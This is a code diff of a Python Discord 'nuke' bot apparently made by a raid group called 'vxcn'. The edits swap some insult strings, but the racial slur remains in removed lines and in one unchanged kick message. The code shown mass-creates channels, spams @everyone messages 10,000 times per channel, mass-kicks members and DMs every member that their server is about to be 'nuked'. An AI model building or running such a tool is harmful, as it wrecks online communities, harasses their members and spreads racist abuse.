@@ -47,7 +47,7 @@ intents.messages = True
 intents.message_content = True
 
 bot = commands.Bot(command_prefix='$', intents=intents)
-channel_names = ['NUKEDLOL', 'DUMB-NIGGA', 'VXCN-ON-TOP', 'lmao', '891076147911', 'RAIDED-BY-VXCN', 'vxcn-runs-you', 'LOL', 'SKID']
+channel_names = ['NUKEDLOL', 'DUMB-BITCH', 'VXCN-ON-TOP', 'lmao', '891076147911', 'RAIDED-BY-VXCN', 'get-ran', 'LOL', 'SKID']
 
 async def async_input(prompt: str) -> str:
     """Async wrapper for input() to avoid blocking the bot."""
@@ -280,7 +280,7 @@ async def startnuke(guild):
     async def spam_messages(channel):
         for _ in range(10000):
             await channel.send(f'@everyone I RUN YOU BITCH')
-            await channel.send(f'@everyone LOL DUMB NIGGA')
+            await channel.send(f'@everyone lmfao')
             await channel.send(f'@everyone raided by daddy vxcn')
     for i in range(50):
         channel_name = random.choice(channel_names)
@@ -320,7 +320,7 @@ async def kick(ctx):
 
         for member, result in zip(batch, results):
             if isinstance(result, discord.Forbidden):
-                await ctx.send(f'DUMB NIGGA I CANT KICK {member.name}!')
+                await ctx.send(f'DUMB BITCH I CANT KICK {member.name}!')
             elif isinstance(result, discord.HTTPException):
                 await ctx.send(f'GET KICKED DUMB N1GGA {member.name}')
             else:
@@ -445,7 +445,7 @@ async def dm(ctx):
         for member in ctx.guild.members:
             if not member.bot:
                 try:
-                    await member.send(f"NIGGA  {member.mention} {server_name} IS ABOUT TO GET NUKED!")
+                    await member.send(f"LOL {member.mention} {server_name} IS ABOUT TO GET NUKED!")
                     print(Fore.MAGENTA + f"Sent DM to {member.name}")
                 except discord.Forbidden:
                     print(Fore.MAGENTA + f"Could not send DM to {member.name}. They might have DMs disabled.")
